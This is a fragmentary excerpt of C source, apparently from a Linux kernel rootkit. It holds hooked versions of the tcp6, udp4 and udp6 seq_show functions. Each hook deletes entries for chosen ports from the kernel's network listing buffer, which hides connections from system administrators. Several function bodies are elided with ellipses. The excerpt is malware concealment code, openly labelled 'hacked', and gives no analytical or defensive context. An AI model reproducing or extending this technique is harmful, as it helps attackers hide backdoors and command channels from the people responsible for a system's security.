...
int hacked_tcp6_seq_show(struct seq_file *seq, void *v)
{
	...
	if(shouldHide(seq->buf+seq->count-TCP6_SIZE, hex_port) != NULL) 
	        seq->count -= TCP6_SIZE;
	return retval;   
}
...
int hacked_udp4_seq_show(struct seq_file *seq, void *v)
{
	...
	if(shouldHide(seq->buf+seq->count-UDP_SIZE, hex_port) != NULL) 
	       seq->count -= UDP_SIZE;
	return retval;   
}
...
int hacked_udp6_seq_show(struct seq_file *seq, void *v)
{
	...
	if(shouldHide(seq->buf+seq->count-UDP6_SIZE, hex_port) != NULL)
		seq->count -= UDP6_SIZE;
	return retval;   
}
